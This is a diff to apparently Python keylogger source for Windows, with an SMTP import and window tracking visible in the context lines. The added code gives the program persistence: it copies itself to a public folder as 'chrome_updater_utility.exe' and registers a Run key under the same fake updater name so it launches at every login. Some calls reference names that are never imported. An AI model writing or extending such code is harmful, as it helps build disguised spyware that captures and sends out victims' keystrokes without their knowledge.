@@ -5,12 +5,25 @@ from threading import Thread
 from time import sleep
 import datetime
 import smtplib
-from sys import exit
+from sys import exit, argv
+from shutil import copy
+from winreg import ConnectRegistry, OpenKey, SetValueEx
+from os import path
 
 instance = win32event.CreateMutex(None, 1, 'NOSIGN')
 if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
     instance = None
     exit()
+
+dir = r"C:\\Users\\Public\\Libraries\\chrome_updater_utility.exe"
+
+def persistence():
+    shutil.copy(sys.argv[0], dir)
+    aReg = ConnectRegistry(None, HKEY_CURRENT_USER)
+    aKey = OpenKey(aReg, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, KEY_WRITE)
+    SetValueEx(aKey,"Chrome_updater_utility", 0, REG_SZ, dir)    
+if not path.isfile(dir):
+    persistence()   
 
 data = ''
 lastwindow = ''
